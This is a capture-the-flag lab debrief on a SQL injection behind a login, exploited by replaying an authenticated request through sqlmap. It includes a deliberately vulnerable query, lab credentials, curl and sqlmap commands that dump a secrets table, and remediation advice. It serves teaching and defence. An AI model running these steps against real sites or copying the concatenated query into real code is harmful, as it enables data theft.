# The Warden's Ledger, Debrief

**Node:** `p2_4` &middot; **Flag:** `SEIYAKU{replay_the_signed_request}` &middot; **Route:** `POST /p2/ledger` &middot; **Sink:** `challenges/phase2.py`, `mariadb` (`prisoners` table, `warden_vault` table)

## Root cause

The ledger lookup builds its query the same way every SQL floor in this lab
does, raw f-string concatenation, no escaping:

```python
# challenges/phase2.py
q = ("SELECT cell_id, name, status FROM prisoners "
     f"WHERE cell_id = '{cell_id}'")  # VULN: string concat
cur.execute(q)
rows = cur.fetchall()
```

What makes this floor its own lesson is the line guarding it. The route
refuses to run that query at all unless the request already carries a valid
warden session:

```python
authed = bool(session.get("warden"))
if not authed:
    return render_template("p2_ledger.html", authed=False, ...)  # login gate only
```

The injection is completely real, but it lives *inside an authenticated
session*. The sign-in itself is not injectable (credentials are compared to
fixed constants in Python, never a query), so the only sink on this floor is
`cell_id`, reachable only after you log in. `warden_vault.secret` holds the
flag and is never touched by the legitimate lookup.

## The technique: pointing sqlmap at an authenticated request

This floor is not about a new *kind* of injection. It's about the single
most common reason a real sqlmap run finds "nothing" on a target that is
genuinely vulnerable: the injectable request only works while logged in,
and sqlmap was given the *logged-out* version of it.

The reflex first move, handing sqlmap a bare URL:

```
sqlmap -u "http://localhost:8000/p2/ledger?cell_id=1" --batch
```

fails here, and it fails quietly. That request has no session cookie, so the
route returns the sign-in page and never processes `cell_id` at all. sqlmap
sees a stable page that doesn't react to its payloads and reports no
injection. Nothing is wrong with the target; the request was wrong.

The fix is to give sqlmap the request you send *after* signing in, cookie
and all. Two equivalent ways:

- **Save the whole authenticated request to a file and replay it with
  `-r`.** This is the workhorse: a saved request carries the method, the
  POST body, the `Content-Type`, and the `Cookie` header exactly as the
  browser (or Burp) sent them, so sqlmap reproduces the request the app
  actually expects. This is what `solvers/p2_4.sh` does.
- **Reconstruct it by hand with `--data` and `--cookie`.** Good to know for
  quick one-offs:

  ```
  sqlmap -u "http://localhost:8000/p2/ledger" \
      --data "cell_id=1" \
      --cookie "session=<your-session-cookie>" \
      -p cell_id --batch
  ```

## The walk (verified live against this exact seed)

**Where the input goes.** After signing in, the lookup is a POST to
`/p2/ledger` with a body field `cell_id`, and the browser sends the booth's
`session` cookie with it. Those three facts (POST, `cell_id`, `session`
cookie) are everything sqlmap needs; you get them by signing in once and
looking at the request.

**1. Log in and capture the session cookie.** With `curl`, save cookies to a
jar:

```
curl -s -c cookies.txt --data "username=warden&password=tower-key-7" \
    http://localhost:8000/p2/ledger/login
```

The response sets a `session` cookie. (In a browser you'd read it from
devtools; in Burp you'd just use the request Burp already captured.)

**2. Save the authenticated request.** Write the exact POST, including the
captured cookie, to a file `req.txt`:

```
POST /p2/ledger HTTP/1.1
Host: localhost:8000
User-Agent: seiyaku-arc-solver
Content-Type: application/x-www-form-urlencoded
Cookie: session=<value from step 1>
Content-Length: 9
Connection: close

cell_id=1
```

**3. Run the normal chain through it.** From here it's the same sqlmap
workflow as A Sealed Floor (p2_2), only sourced from an authenticated
request:

```
sqlmap -r req.txt -p cell_id --batch --ignore-stdin --dump -T warden_vault
```

sqlmap confirms `cell_id` is injectable, and because the request is
authenticated, every payload it sends now actually reaches the query. It
enumerates and dumps `warden_vault`:

```
Database: seiyaku_p2_ledger
Table: warden_vault
[1 entry]
+----+--------------------+------------------------------------+
| id | label              | secret                             |
+----+--------------------+------------------------------------+
| 1  | warden master pass | SEIYAKU{replay_the_signed_request} |
+----+--------------------+------------------------------------+
```

(`--ignore-stdin` is the same non-interactive gotcha covered in A Sealed
Floor's debrief; keep it whenever you drive sqlmap from a script.)

## HxH analogy

Trick Tower's rules are enforced at the door, not on the person. A guard who
has already waved you through stops checking; the tower assumes anyone past
the checkpoint belongs there and answers them freely. Someone trying to
shout questions at the ledger from *outside* the checkpoint gets nothing,
not because the ledger is careful, but because it isn't even listening to
strangers.

The lookup's mistake is that same misplaced trust. It never re-examines who
is asking once a session says "warden"; it just answers. The way through
isn't to defeat the checkpoint, it's to walk past it the honest way first,
then bring your real question, and your tools, along with you. An attacker
with valid low-value credentials (or a stolen session) is inside the trust
boundary, and the ledger's injection was always waiting there for anyone who
bothered to sign in.

## Remediation

- **Parameterized queries, always**, the same root fix as every floor:

  ```python
  cur.execute(
      "SELECT cell_id, name, status FROM prisoners WHERE cell_id = %s",
      (cell_id,),
  )
  ```

  Authentication is not a substitute for this. A login gate only decides
  *who* can reach the query; it does nothing about the query being
  injectable once reached. Plenty of real breaches come from a low-privilege
  authenticated user (or a stolen session) hitting an injectable
  behind-login endpoint.
- **Treat authenticated endpoints as in-scope for injection testing**, not
  as "safe because they need a login." The most valuable injection is often
  the one behind auth, precisely because teams assume no one hostile will be
  on the other side of it.
- **Least privilege on the DB account**, same as the rest of the lab: the
  ledger's user can read only what the lookup needs, so a table like
  `warden_vault` that its legitimate queries never touch shouldn't be
  reachable at all.

## Isolation

This floor lives in its own database (`seiyaku_p2_ledger`) and connects as
its own restricted user (`svc_p2_ledger`), granted access to nothing else.
Verified live: from that user, `information_schema` shows only this floor's
own two tables (`prisoners`, `warden_vault`), a cross-database read of
another challenge's table is denied (`ERROR 1142`), and `USE` of another
challenge's database is denied (`ERROR 1044`). Solving this floor cannot
surface any other challenge's data or flag. (Every MariaDB-backed challenge
in the lab is isolated the same way.)
